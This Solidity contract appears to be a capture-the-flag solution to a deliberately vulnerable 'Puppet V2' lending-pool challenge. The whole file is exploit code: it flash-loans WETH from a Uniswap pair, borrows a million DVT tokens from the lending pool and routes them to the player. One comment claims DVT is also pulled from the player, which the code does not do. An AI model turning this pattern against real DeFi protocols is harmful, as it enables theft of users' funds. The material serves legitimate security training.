// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Callee} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import {PuppetV2Pool} from "./PuppetV2Pool.sol";

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external returns (uint256);
}

/**
 * @title PuppetV2PoolExploit
 * @author scorpion9979
 */
contract PuppetV2PoolExploit is IUniswapV2Callee {
    IUniswapV2Pair public immutable pool;
    PuppetV2Pool public immutable puppet;
    IERC20 public immutable dvt;
    IERC20 public immutable weth;

    event Loan(uint256 value);

    constructor(IUniswapV2Pair pool_, PuppetV2Pool puppet_) public {
        pool = pool_;
        puppet = puppet_;
        dvt = IERC20(pool_.token0());
        weth = IERC20(pool_.token1());
    }

    function exploit() external {
        // Flash loan all WETH tokens but 1 wei from the pool and execute the attack.
        pool.swap(0, weth.balanceOf(address(pool)) - 1, address(this), abi.encode(address(msg.sender)));
    }

    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external override {
        require(msg.sender == address(pool));
        require(sender == address(this));

        // Get the player address from the data
        (address player) = abi.decode(
            data,
            (address)
        );

        // Calculate the amount of WETH that was flash loaned.
        uint256 loanedWethAmount = amount0 == 0 ? amount1 : amount0;

        // Transfer all player DVT and WETH tokens to the exploit contract to be used for the attack.
        require(weth.transferFrom(player, address(this), weth.balanceOf(player)));

        // Approve the PuppetV2Pool contract to spend the WETH tokens (required for borrowing).
        weth.approve(address(puppet), 2**256 - 1);

        // Calculate the amount of WETH required to borrow 1 million DVT tokens.
        require(puppet.calculateDepositOfWETHRequired(1_000_000e18) < weth.balanceOf(address(this)), "LOAN_FAILED");

        // Borrow 1 million DVT tokens.
        puppet.borrow(1_000_000e18);

        // Make sure the exploit contract has 1 million DVT tokens.
        require(dvt.balanceOf(address(this)) == 1_000_000e18, "BORROW_FAILED");

        // Transfer all DVT tokens to the player.
        dvt.transfer(address(player), dvt.balanceOf(address(this)));

        // Repay the pool flash loan.
        weth.transfer(address(pool), loanedWethAmount * 1000 / 997);

        // Transfer all remaining WETH tokens to the player.
        weth.transfer(address(player), weth.balanceOf(address(this)));
    }
}
